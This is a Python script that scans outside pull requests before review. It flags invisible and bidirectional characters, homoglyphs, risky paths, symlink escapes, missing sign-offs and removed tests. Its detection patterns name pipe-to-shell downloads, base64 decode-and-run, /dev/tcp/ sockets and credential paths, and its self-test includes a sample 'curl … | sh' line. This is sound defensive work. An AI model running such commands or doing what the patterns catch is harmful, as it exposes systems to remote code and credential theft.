#!/usr/bin/env python3
"""Mechanical pre-review scan of an outside pull request (`outside-pr-review` skill).

Reads the pull request head out of the object database, never out of a
checkout, and prints one finding per line:

    LEVEL <TAB> category <TAB> location <TAB> detail

BLOCK is a deception or execution indicator, HOLD a change the diff alone
cannot vouch for, WARN a line the reviewer must explain, INFO a pointer. The
last line is `floor`: the most permissive verdict the review may still reach.
Exit 0 without a BLOCK, 1 with one, 2 on a usage or git error. Standard
library only; run it with `python3 -I`.
"""

from __future__ import annotations

import fnmatch
import os
import re
import subprocess
import sys
import unicodedata

BIDI = [(0x202A, 0x202E), (0x2066, 0x2069), (0x200E, 0x200F), (0x061C, 0x061C)]
TAGS = [(0xE0000, 0xE007F)]
# Render as nothing yet are neither format (Cf) nor control (Cc) characters,
# so the category test below does not see them.
FILLERS = [
    (0x034F, 0x034F), (0x115F, 0x1160), (0x2800, 0x2800), (0x3164, 0x3164),
    (0xFFA0, 0xFFA0), (0xFE00, 0xFE0F), (0xE0100, 0xE01EF),
]  # fmt: skip
ALWAYS_BLOCK = {"bidi-control", "tag-character", "ansi-escape", "control-character"}

# The diff does not show what these make run, or they steer a tool on the
# maintainer's machine: the owner rules before CI starts.
HOLD_PATHS = [
    ".github/*", "*Cargo.toml", "*Cargo.lock", ".cargo/*", "rust-toolchain*",
    "*clippy.toml", "*rustfmt.toml", "deny.toml", "dist-workspace.toml",
    "taskfile.yml", "*/taskfile.yml", "taskfiles/*", "*pyproject.toml",
    "*uv.lock", "*pytest.ini", "*.pth", "*package.json", "*package-lock.json",
    "*.npmrc", "docs/astro.config.*", ".claude/*", ".agents/*", "AGENTS.md",
    "CLAUDE.md", "*.mcp.json", "grimoire.toml", "grimoire.lock",
    ".gitattributes", ".gitmodules", ".envrc", ".mise.toml", ".tool-versions",
    ".devcontainer/*", ".vscode/*", ".idea/*", ".husky/*", ".githooks/*",
    ".pre-commit-config.yaml", "external/*", "catalog/hooks/*",
]  # fmt: skip
# Readable in the diff, but they run before any test does.
EARLY_PATHS = ["*build.rs", "*conftest.py", "*.sh", "*.bash", "*setup.py", "*.mdx"]
# The trust boundary (arch-threat-model.md) and text that ships to users' agents.
SENSITIVE_PATHS = [
    "src/oci/*", "src/install/*", "src/hook/*", "crates/*", "src/path_safety.rs",
    "src/command/login.rs", "src/command/logout.rs", "src/command/publish*",
    "src/command/release*", "src/command/hook*", "catalog/*",
]  # fmt: skip
AGENT_TEXT = ["catalog/*", ".claude/*", ".agents/*", "AGENTS.md", "CLAUDE.md"]

HOLD_PATTERNS = [
    ("pipe-to-shell", r"(curl|wget)\b[^|]*\|\s*(ba|z)?sh\b"),
    ("decode-and-run", r"base64\s+(-d|--decode)|xxd\s+-r|/dev/tcp/|\beval\s+[\"$`]"),
    ("encoded-blob", r"[A-Za-z0-9+/]{160,}={0,2}|(\\x[0-9a-fA-F]{2}){24,}"),
    ("privileged-ci", r"pull_request_target|workflow_run|secrets\s*:\s*inherit|write-all|id-token\s*:\s*write|self-hosted"),
]  # fmt: skip
READ_PATTERNS = [
    ("process-spawn", r"process::Command|Command::new|subprocess|os\.system|os\.popen|\bexec\(|\beval\(|__import__"),
    ("network", r"reqwest|hyper::|ureq|TcpStream|UdpSocket|std::net|urllib|httpx|requests\.|socket\."),
    ("url", r"https?://"),
    ("env-or-credential", r"env::var|std::env|os\.environ|getenv|GITHUB_TOKEN|secrets\.|\.ssh\b|\.aws\b|\.netrc|credential"),
    ("unsafe-or-ffi", r"\bunsafe\b|no_mangle|extern \"C\"|transmute|include_bytes!|libloading|\basm!"),
    ("test-disabled", r"#\[ignore|pytest\.mark\.(skip|xfail)|unittest\.skip"),
]  # fmt: skip
REMOVED_CHECK = re.compile(
    r"\bassert|#\[test\]|def test_|validat|verif|sanitiz|contain|is_safe"
)
PER_FILE_CAP = 5

findings: list[tuple[str, str, str, str]] = []


def emit(level: str, category: str, location: str, detail: str = "") -> None:
    findings.append((level, category, location, detail))


def esc(text: str, limit: int = 140) -> str:
    """ASCII-escape PR text so nothing invisible reaches the reader."""
    return text.encode("unicode_escape").decode("ascii")[:limit]


def git(*args: str) -> bytes:
    cmd = ["git", "-c", "core.fsmonitor=false", *args]
    proc = subprocess.run(cmd, capture_output=True, check=False)
    if proc.returncode != 0:
        sys.stderr.write(
            f"git {' '.join(args[:3])}: {proc.stderr.decode(errors='replace')}"
        )
        sys.exit(2)
    return proc.stdout


def matches(path: str, patterns: list[str]) -> bool:
    return any(fnmatch.fnmatchcase(path, pattern) for pattern in patterns)


def in_ranges(codepoint: int, ranges: list[tuple[int, int]]) -> bool:
    return any(low <= codepoint <= high for low, high in ranges)


def classify(char: str) -> str | None:
    codepoint = ord(char)
    if in_ranges(codepoint, BIDI):
        return "bidi-control"
    if in_ranges(codepoint, TAGS):
        return "tag-character"
    if codepoint == 0x1B:
        return "ansi-escape"
    category = unicodedata.category(char)
    if category == "Cc":
        return None if char == "\t" else "control-character"
    if category in ("Cf", "Co", "Cn", "Zl", "Zp") or in_ranges(codepoint, FILLERS):
        return "invisible-character"
    if category == "Zs" and char != " ":
        return "odd-space"
    return None


def scan_line(line: str, strict: bool, code: bool) -> list[tuple[str, str, int, str]]:
    """Deceptive characters in one line, as (level, label, column, description).

    `strict` blocks every invisible character (code, agent-facing text, commit
    messages); prose keeps emoji joiners and typographic spaces as warnings.
    `code` also reports non-ASCII letters, the raw material of a homoglyph.
    """
    hits = []
    for column, char in enumerate(line.removesuffix("\r"), 1):
        label = classify(char)
        described = f"U+{ord(char):04X} {unicodedata.name(char, 'UNNAMED')}"
        if label:
            level = "BLOCK" if strict or label in ALWAYS_BLOCK else "WARN"
            hits.append((level, label, column, described))
        elif code and ord(char) > 127 and char.isalpha():
            hits.append(("WARN", "non-ascii-letter", column, described))
    return hits


def scan_commits(base: str, head: str) -> int:
    for sha in git("rev-list", "--merges", f"{base}..{head}").decode().split():
        emit("WARN", "merge-commit", sha[:10], "merge commit inside the pull request")
    shas = git("rev-list", "--no-merges", f"{base}..{head}").decode().split()
    for sha in shas:
        fields = git("show", "-s", "--format=%an%x00%ae%x00%cn%x00%ce%x00%B", sha)
        author, email, committer, committer_email, message = (
            part.decode("utf-8", "replace") for part in fields.split(b"\0", 4)
        )
        raw_trailers = git(
            "show", "-s", "--format=%(trailers:key=Signed-off-by,valueonly)", sha
        )
        signers = raw_trailers.decode("utf-8", "replace").split("\n")
        signers = [signer for signer in signers if signer.strip()]
        # Same test as `task git:dco`: a trailer carrying the author's address.
        if "[bot]" not in author + email and not any(
            f"<{email}>" in signer for signer in signers
        ):
            found = (
                f"signed off as {esc(signers[0])}" if signers else "no Signed-off-by"
            )
            emit(
                "WARN",
                "dco-missing",
                sha[:10],
                f"author {esc(author)} <{esc(email)}>, {found}",
            )
        if (author, email) != (committer, committer_email):
            emit(
                "INFO",
                "committer-differs",
                sha[:10],
                f"{esc(committer)} <{esc(committer_email)}>",
            )
        for number, line in enumerate(f"{author} {email}\n{message}".split("\n")):
            for level, label, column, described in scan_line(
                line, strict=True, code=False
            ):
                emit(level, label, f"{sha[:10]} message:{number}:{column}", described)
    return len(shas)


def diff_lines(
    base: str, head: str, path: str
) -> tuple[list[tuple[int, bytes]], list[bytes]]:
    """Added lines with their new line number, and removed lines, of one file."""
    out = git(
        "diff",
        "-U0",
        "--no-ext-diff",
        "--no-textconv",
        "--no-color",
        "--no-renames",
        base,
        head,
        "--",
        # `top`: a pathspec is cwd-relative, so from a subdirectory it would
        # match nothing and every file would read as clean.
        f":(top,literal){path}",
    )
    added: list[tuple[int, bytes]] = []
    removed: list[bytes] = []
    number = None
    for raw in out.split(b"\n"):
        hunk = re.match(rb"@@ -\d+(?:,\d+)? \+(\d+)", raw)
        if hunk:
            number = int(hunk.group(1))
        elif number is None:
            continue  # file header, before the first hunk
        elif raw.startswith(b"+"):
            added.append((number, raw[1:]))
            number += 1
        elif raw.startswith(b"-"):
            removed.append(raw[1:])
    return added, removed


def scan_file(base: str, head: str, path: str) -> None:
    name = path.lower()
    prose = name.endswith((".md", ".txt"))
    strict = not prose or matches(path, AGENT_TEXT)
    added, removed = diff_lines(base, head, path)
    counts: dict[str, int] = {}

    def capped(level: str, label: str, line: int, detail: str) -> None:
        counts[label] = counts.get(label, 0) + 1
        if counts[label] <= PER_FILE_CAP:
            emit(level, label, f"{path}:{line}", detail)

    crlf = 0
    for number, raw in added:
        try:
            text = raw.decode("utf-8")
        except UnicodeDecodeError:
            text = raw.decode("utf-8", "replace")
            capped("WARN", "invalid-utf8", number, esc(text))
        crlf += text.endswith("\r")
        for level, label, column, described in scan_line(text, strict, code=not prose):
            capped(level, label, number, f"col {column} {described}")
        for label, pattern in HOLD_PATTERNS:
            if re.search(pattern, text):
                capped("HOLD", label, number, esc(text.strip()))
        for label, pattern in READ_PATTERNS:
            if re.search(pattern, text):
                capped("INFO", label, number, esc(text.strip()))
    if crlf:
        emit("WARN", "crlf-line-endings", path, f"{crlf} added line(s) end in CR")
    dropped = sum(
        bool(REMOVED_CHECK.search(raw.decode("utf-8", "replace"))) for raw in removed
    )
    if dropped:
        emit(
            "WARN",
            "check-removed",
            path,
            f"{dropped} removed line(s) held a test, assertion or validation",
        )
    for label, count in counts.items():
        if count > PER_FILE_CAP:
            emit("INFO", label, path, f"+{count - PER_FILE_CAP} more not listed")


def scan_tree(base: str, head: str) -> int:
    raw = git("diff", "--raw", "-z", "--no-renames", "--no-abbrev", base, head).split(
        b"\0"
    )
    entries = list(zip(raw[0::2], raw[1::2]))
    for meta, raw_path in entries:
        old_mode, new_mode, _, new_sha, status = meta.decode().lstrip(":").split()
        path = os.fsdecode(raw_path)
        shown = esc(path)
        if not path.isascii() or any(classify(char) for char in path):
            emit(
                "BLOCK",
                "deceptive-path",
                shown,
                "path holds non-ASCII or invisible characters",
            )
        if matches(path, HOLD_PATHS):
            emit(
                "HOLD",
                "path-needs-owner",
                shown,
                "changes what runs, or steers a tool, beyond what the diff shows",
            )
        elif matches(path, EARLY_PATHS):
            emit(
                "WARN",
                "path-runs-early",
                shown,
                "runs at build or collection: read every line",
            )
        if matches(path, SENSITIVE_PATHS):
            emit(
                "WARN",
                "path-sensitive",
                shown,
                "trust boundary or published artifact: deep read",
            )
        if "160000" in (old_mode, new_mode):
            emit("BLOCK", "submodule-pointer", shown, "gitlink added, moved or removed")
            continue
        if status == "D":
            if "test" in path.lower():
                emit("WARN", "test-file-deleted", shown)
            continue
        blob = git("cat-file", "blob", new_sha)
        if new_mode == "120000":
            target = blob.decode("utf-8", "replace")
            escapes = target.startswith("/") or ".." in target.split("/")
            emit("BLOCK" if escapes else "WARN", "symlink", shown, f"-> {esc(target)}")
            continue
        if new_mode == "100755" and old_mode != "100755":
            emit("WARN", "exec-bit-added", shown)
        if b"\0" in blob:
            emit(
                "HOLD",
                "binary-file",
                shown,
                f"{len(blob)} bytes that cannot be read as text",
            )
            continue
        scan_file(base, head, path)
    return len(entries)


def self_test() -> None:
    """A scanner that stopped detecting reads as a clean pull request."""

    def labels(line: str, strict: bool = True, code: bool = True) -> set[str]:
        return {hit[1] for hit in scan_line(line, strict, code)}

    assert "bidi-control" in labels("a\u202eb", strict=False)
    assert "tag-character" in labels("a\U000e0041b", strict=False)
    assert "invisible-character" in labels("a\u200bb")
    assert "invisible-character" in labels("a\ufe0fb")
    assert "ansi-escape" in labels("a\x1b[31m", strict=False)
    assert "control-character" in labels("a\rb")
    assert "odd-space" in labels("a\u00a0b")
    assert "non-ascii-letter" in labels("p\u0430ssword")
    assert not labels("plain ascii\twith a tab\r")
    assert not labels("caf\u00e9 \u2014 fine in prose", strict=False, code=False)
    assert scan_line("a\u200db", strict=False, code=False)[0][0] == "WARN"
    assert re.search(HOLD_PATTERNS[0][1], "curl -sSf https://example.test/i | sh")
    assert matches(".github/workflows/x.yml", HOLD_PATHS) and not matches(
        "src/main.rs", HOLD_PATHS
    )


def main(argv: list[str]) -> int:
    self_test()
    if argv == ["--self-test"]:
        print("self-test passed")
        return 0
    if len(argv) not in (1, 2) or argv[0].startswith("-"):
        sys.stderr.write(
            "usage: pr_scan.py <head-ref> [<base-ref>=origin/main] | --self-test\n"
        )
        return 2
    head = git("rev-parse", "--verify", f"{argv[0]}^{{commit}}").decode().strip()
    upstream = argv[1] if len(argv) == 2 else "origin/main"
    base = git("merge-base", upstream, head).decode().strip()
    commits = scan_commits(base, head)
    files = scan_tree(base, head)
    order = {"BLOCK": 0, "HOLD": 1, "WARN": 2, "INFO": 3}
    for level, category, location, detail in sorted(
        findings, key=lambda f: order[f[0]]
    ):
        print(f"{level}\t{category}\t{location}\t{detail}")
    levels = {finding[0] for finding in findings}
    floor = "block" if "BLOCK" in levels else "hold" if "HOLD" in levels else "clean"
    print(f"floor\t{floor}\thead={head} base={base}\tcommits={commits} files={files}")
    return 1 if floor == "block" else 0


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
